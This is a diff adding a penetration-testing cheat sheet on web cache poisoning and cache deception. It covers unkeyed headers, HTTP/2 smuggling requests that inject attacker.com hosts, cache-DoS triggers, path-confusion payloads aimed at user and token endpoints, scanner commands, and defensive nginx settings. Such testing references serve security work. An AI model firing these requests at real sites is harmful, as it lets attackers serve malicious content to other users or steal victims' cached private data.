@@ -1,4 +1,237 @@
 
+# Updated & Modernized: Cache Poisoning & Cache Deception (2025/2026)
+
+---
+
+## Core Distinction (Still Relevant)
+
+| Attack | Attacker Goal | Who Gets Hurt |
+|---|---|---|
+| **Cache Poisoning** | Store malicious content in cache | Other users load attacker's payload |
+| **Cache Deception** | Store victim's sensitive data in cache | Attacker retrieves victim's data |
+
+---
+
+## Cache Poisoning — Modern Techniques
+
+### 1. Unkeyed Header Discovery (Updated Tooling)
+
+The old **Param Miner** (Burp extension) is still valid, but complement with:
+
+```bash
+# Web Cache Vulnerability Scanner (actively maintained)
+wcvs -u https://target.com -v
+
+# nuclei templates (cache-specific)
+nuclei -u https://target.com -t cache-poisoning/
+```
+
+**High-value headers to test in 2025/2026:**
+
+```text
+X-Forwarded-Host
+X-Forwarded-Scheme
+X-Forwarded-For
+X-Original-URL
+X-Rewrite-URL
+X-Host
+Forwarded
+X-HTTP-Method-Override
+X-Real-IP
+```
+
+---
+
+### 2. Fat GET / HTTP/2 Pseudo-Header Poisoning (New)
+
+HTTP/2 introduces new poisoning surfaces — some CDNs translate HTTP/2 pseudo-headers into HTTP/1.1 headers inconsistently:
+
+```text
+:authority   →  Host (sometimes both forwarded)
+:path        →  Can differ from cache key path
+:scheme      →  Can override X-Forwarded-Scheme
+```
+
+**Test:** Send HTTP/2 requests with a manipulated `:authority` pseudo-header differing from the `Host` header. Some origins key on one but not the other.
+
+---
+
+### 3. Cache Key Normalization Attacks
+
+Modern CDNs (Cloudflare, Fastly, Akamai) normalize URLs differently than origin servers. Exploit the gap:
+
+```text
+# These may cache as the same key but hit different backend paths:
+/api/v1/user%2Fprofile
+/api/v1/user/profile
+
+# Fragment handling (still relevant post-ATS CVE-2021-27577)
+/page#/../sensitive
+
+# Semicolon parameter delimiters (PHP/Java backends)
+/page;jsessionid=xxx.js
+```
+
+---
+
+### 4. Host Header Injection via CDN Routing
+
+```http
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.attacker.com
+```
+
+**2025 context:** Many orgs moved to Cloudflare Workers or AWS CloudFront with origin shield — test if `X-Forwarded-Host` bypasses the worker and hits the origin, then gets cached back through the shield layer.
+
+---
+
+### 5. Request Smuggling → Cache Poisoning (Still Critical)
+
+HRS-based cache poisoning remains one of the **highest severity** chains. Updated surface:
+
+- **HTTP/2 Downgrade Smuggling** (H2.CL, H2.TE) is now the primary vector since most TLS termination proxies downgrade to HTTP/1.1 internally
+- Burp Suite's **HTTP Request Smuggler** extension covers H2 variants
+
+```text
+POST / HTTP/2
+Host: target.com
+Content-Length: 0
+Transfer-Encoding: chunked
+
+0
+
+GET /poisoned-resource HTTP/1.1
+Host: attacker.com
+```
+
+---
+
+### 6. Web Cache Poisoning via DoS (CP-DoS) — Updated
+
+Still highly underreported. Modern patterns:
+
+| Method | Trigger | Effect |
+|---|---|---|
+| Invalid `Content-Type` | GitHub-style (still works on clones) | Cached 400/405 |
+| Oversized headers | Many Nginx/Varnish configs | Cached 400 |
+| `X-HTTP-Method-Override: DELETE` | GCP/Azure storage backends | Cached empty/error |
+| Illegal header chars (`\`, non-tchar) | Akamai and others | Cached 400 |
+
+---
+
+### 7. CDN-Specific Notes (2025/2026)
+
+**Cloudflare:**
+- No longer caches 403s by default (patched ~2020)
+- Cache Rules (new UI) replace Page Rules — misconfigured Cache Rules are a new audit target
+- Workers can introduce custom cache logic — **always test Worker-modified responses**
+
+**Fastly/Varnish:**
+- Still vulnerable to param casing tricks (`siz%65` vs `size`)
+- VCL misconfigurations are common in orgs that self-manage
+
+**AWS CloudFront:**
+- Cache behaviors tied to path patterns — test path traversal between behaviors
+- Signed URLs/Cookies don't prevent poisoning of unsigned resources
+- Lambda@Edge can introduce custom unkeyed processing
+
+**Akamai:**
+- Illegal header forwarding behavior appears partially patched but configuration-dependent — retest per engagement
+
+---
+
+## Cache Deception — Modern Techniques
+
+### Classic Pattern (Still Works)
+
+```text
+GET /account/profile.php/nonexistent.js
+GET /api/user/me.css
+GET /dashboard/../nonexistent.css
+GET /profile%2F..%2Fnonexistent.js
+```
+
+### Updated Extension List to Test
+
+Beyond `.js`, `.css`, `.png` — test:
+
+```text
+.avif  .woff  .woff2  .ttf  .ico
+.svg   .webp  .json   .map  .xml
+```
+
+`.json` is particularly interesting — many SPAs have API routes that return sensitive data, and `.json` may be in the CDN cache allowlist.
+
+### API Endpoint Cache Deception (Modern Apps)
+
+SPA/microservice architectures often expose JSON APIs directly through CDNs:
+
+```text
+GET /api/v1/me.js       → returns JSON user data, cached as JS
+GET /api/v1/tokens.css  → cached sensitive token data
+```
+
+### Path Confusion with Framework Routing
+
+```text
+# Rails / Laravel / Express path tolerance
+/profile/../../../../etc/nonexistent.js
+/profile;/nonexistent.css    (Java Spring)
+/profile%00.js               (null byte, less common now)
+```
+
+---
+
+## Detection & Defense (For Defenders)
+
+```nginx
+# Nginx: Never cache based on file extension alone
+location ~* \.(js|css|png)$ {
+    # Validate Content-Type matches, not just extension
+    if ($upstream_http_content_type !~ "^(text/javascript|text/css|image/png)") {
+        add_header Cache-Control "no-store";
+    }
+}
+```
+
+**Key defensive controls:**
+
+1. **Include `Vary: Cookie, Authorization`** on authenticated responses to prevent cross-user cache sharing
+2. **Normalize cache keys server-side** — strip unknown headers before they reach origin
+3. **Audit CDN Cache Rules / Page Rules** for overly broad path matches
+4. **Use `Cache-Control: no-store`** on all authenticated/sensitive endpoints — don't rely on CDN "don't cache HTML" defaults
+5. **Monitor for CP-DoS** — spike in 400/405 cache hits is a signal
+
+---
+
+## Updated Tooling Summary
+
+| Tool | Use Case |
+|---|---|
+| `wcvs` | Automated cache poisoning scanner |
+| Burp Param Miner | Unkeyed param/header discovery |
+| Burp HTTP Request Smuggler | HRS → cache poison chains |
+| `nuclei` (cache templates) | Fast cache vuln scanning |
+| `ffuf` | Cache key fuzzing, path confusion |
+| `cachemoney` (custom) | Cache deception path fuzzing |
+
+---
+
+## References (Updated)
+
+- https://portswigger.net/web-security/web-cache-poisoning
+- https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
+- https://portswigger.net/research/http2
+- https://hackerone.com/reports/593712
+- https://youst.in/posts/cache-poisoning-at-scale/
+- https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
+- https://bishopfox.com/blog/h2c-smuggling-request (H2 downgrade)
+
+---
+
+> **Key takeaways for 2025/2026:** HTTP/2 smuggling chains, CDN Worker/Edge logic misconfigs, and JSON API cache deception are the highest-yield new surfaces. The fundamentals haven't changed — the attack surface has expanded significantly with edge computing adoption.
+
 ##
 #
 https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cache-deception.md
